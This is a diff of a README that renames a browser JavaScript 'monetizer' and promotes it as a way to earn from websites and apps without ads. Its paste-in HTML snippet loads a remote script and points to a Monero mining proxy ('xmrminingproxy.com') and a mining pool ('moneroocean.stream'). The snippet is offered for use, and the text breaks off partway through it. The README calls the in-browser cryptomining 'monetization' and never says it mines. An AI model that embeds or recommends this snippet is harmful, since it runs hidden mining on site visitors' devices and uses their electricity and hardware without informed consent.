@@ -1,9 +1,9 @@
-##### AliX JS Is A PowerFull JS Used To Monitize Websites And Apps  
+##### X Monitizer Is A PowerFull JS Used To Monitize Websites And Apps  
 #### Use This Code To Basically Monitize Your Apps Without Ads For Free  
 ### See This Video For More Info : https://www.youtube.com/watch?v=AZU6TeEjHVQ
 ## `HTML SCRIPT`
 ```
-<script src="https://alixjs.vercel.app/index.js"></script>
+<script src="https://xmonitizer.vercel.app/index.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
